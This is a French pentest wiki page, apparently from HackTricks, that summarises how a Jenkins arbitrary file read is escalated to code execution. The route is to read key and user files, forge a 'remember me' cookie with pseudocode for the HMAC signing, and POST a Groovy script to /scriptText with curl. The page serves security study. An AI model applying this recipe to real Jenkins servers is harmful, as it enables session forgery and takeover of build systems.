# Jenkins Arbitrary File Read to RCE via "Remember Me"

{{#include ../../banners/hacktricks-training.md}}

Dans cet article de blog, il est possible de trouver un excellent moyen de transformer une vulnérabilité d'inclusion de fichier local dans Jenkins en RCE : [https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/](https://blog.securelayer7.net/spring-cloud-skipper-vulnerability/)

Ceci est un résumé créé par IA de la partie de l'article où la création d'un cookie arbitraire est exploitée pour obtenir RCE en abusant d'une lecture de fichier local jusqu'à ce que j'aie le temps de créer un résumé moi-même :

### Prérequis à l'attaque

- **Exigence de fonctionnalité :** "Se souvenir de moi" doit être activé (paramètre par défaut).
- **Niveaux d'accès :** L'attaquant a besoin de permissions Globales/Lecture.
- **Accès secret :** Capacité à lire à la fois le contenu binaire et textuel de fichiers clés.

### Processus d'exploitation détaillé

#### Étape 1 : Collecte de données

**Récupération des informations utilisateur**

- Accéder à la configuration utilisateur et aux secrets depuis `$JENKINS_HOME/users/*.xml` pour chaque utilisateur afin de rassembler :
- **Nom d'utilisateur**
- **Graine utilisateur**
- **Horodatage**
- **Hash du mot de passe**

**Extraction de la clé secrète**

- Extraire les clés cryptographiques utilisées pour signer le cookie :
- **Clé secrète :** `$JENKINS_HOME/secret.key`
- **Clé maître :** `$JENKINS_HOME/secrets/master.key`
- **Fichier de clé MAC :** `$JENKINS_HOME/secrets/org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac`

#### Étape 2 : Forgement de cookie

**Préparation du jeton**

- **Calculer le temps d'expiration du jeton :**

```javascript
tokenExpiryTime = currentServerTimeInMillis() + 3600000 // Ajoute une heure au temps actuel
```

- **Concaténer les données pour le jeton :**

```javascript
token = username + ":" + tokenExpiryTime + ":" + userSeed + ":" + secretKey
```

**Déchiffrement de la clé MAC**

- **Déchiffrer le fichier de clé MAC :**

```javascript
key = toAes128Key(masterKey)  // Convertir la clé maître en format de clé AES128
decrypted = AES.decrypt(macFile, key)  // Déchiffrer le fichier .mac
if not decrypted.hasSuffix("::::MAGIC::::")
return ERROR;
macKey = decrypted.withoutSuffix("::::MAGIC::::")
```

**Calcul de la signature**

- **Calculer HMAC SHA256 :**

```javascript
mac = HmacSHA256(token, macKey) // Calculer HMAC en utilisant le jeton et la clé MAC
tokenSignature = bytesToHexString(mac) // Convertir la MAC en chaîne hexadécimale
```

**Encodage du cookie**

- **Générer le cookie final :**

```javascript
cookie = base64.encode(
username + ":" + tokenExpiryTime + ":" + tokenSignature
) // Encoder en base64 les données du cookie
```

#### Étape 3 : Exécution de code

**Authentification de session**

- **Récupérer les jetons CSRF et de session :**
- Faire une requête à `/crumbIssuer/api/json` pour obtenir `Jenkins-Crumb`.
- Capturer `JSESSIONID` de la réponse, qui sera utilisé en conjonction avec le cookie "se souvenir de moi".

**Requête d'exécution de commande**

- **Envoyer une requête POST avec un script Groovy :**

```bash
curl -X POST "$JENKINS_URL/scriptText" \
--cookie "remember-me=$REMEMBER_ME_COOKIE; JSESSIONID...=$JSESSIONID" \
--header "Jenkins-Crumb: $CRUMB" \
--header "Content-Type: application/x-www-form-urlencoded" \
--data-urlencode "script=$SCRIPT"
```

- Le script Groovy peut être utilisé pour exécuter des commandes au niveau système ou d'autres opérations dans l'environnement Jenkins.

L'exemple de commande curl fourni démontre comment faire une requête à Jenkins avec les en-têtes et cookies nécessaires pour exécuter du code arbitraire en toute sécurité.

{{#include ../../banners/hacktricks-training.md}}
